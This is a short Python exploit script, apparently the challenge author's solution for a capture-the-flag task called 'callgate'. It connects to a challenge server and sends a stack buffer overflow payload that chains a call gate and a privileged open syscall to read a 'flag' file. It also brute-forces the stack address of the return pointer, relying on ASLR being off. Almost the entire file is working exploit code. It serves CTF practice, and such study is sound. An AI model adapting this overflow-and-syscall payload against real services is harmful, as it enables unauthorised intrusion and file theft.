#!/usr/bin/env python3
import struct
import socket
import sys

# exploit for "callgate" by TheJH (challenge author)

# NOTE: ASLR is off on the server. That was supposed to go into the challenge description, but got left out. :(

TCP_IP = sys.argv[1] # 'wildwildweb.fluxfingers.net'
TCP_PORT = int(sys.argv[2]) # 1413

def open_tcp_connection():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((TCP_IP, TCP_PORT))
  return s

def tryoffset(read_ret_ptr_address):
  privileged_invoke_syscall = 0x07000000
  enter_gate = 0x08048110
  CMD_READ = 1
  stdin_fd = 0
  sys_open = 5
  O_RDONLY = 0
  service_main = 0x080481ba

  stage2_preretptr = b'flag\x00' #+ struct.pack('I', 0)
  stage2_fromretptr = (struct.pack('<I', privileged_invoke_syscall) +
      struct.pack('<IIII', service_main, sys_open, read_ret_ptr_address-len(stage2_preretptr), O_RDONLY))

  # stack buffer overflow, do enter_gate(CMD_READ, stdin_fd, <address in privileged stack>, len(stage2))
  stage1 = (b'#\x00' + b'a'*114 +
      struct.pack('<IIIIII', enter_gate, 0,
      CMD_READ, stdin_fd, read_ret_ptr_address-len(stage2_preretptr),
      len(stage2_preretptr+stage2_fromretptr)) + b'\n')

  complete = stage1 + stage2_preretptr + stage2_fromretptr + b'#hello\npassw0rd\n'

  s = open_tcp_connection()
  s.send(complete)
  response = s.recv(1000, socket.MSG_WAITALL).decode('ascii')
  return response

# bruteforce offset of the return pointer location on the stack
for o in range(0xffffe000, 0xffff0000, -1):
  print(hex(o), end='            \r')
  resp = tryoffset(o)
  if resp != 'Please enter a filename: Attempting to open file...\nUnable to open file.\n':
    print('\n'+resp)
    sys.exit(0)
sys.exit(1)
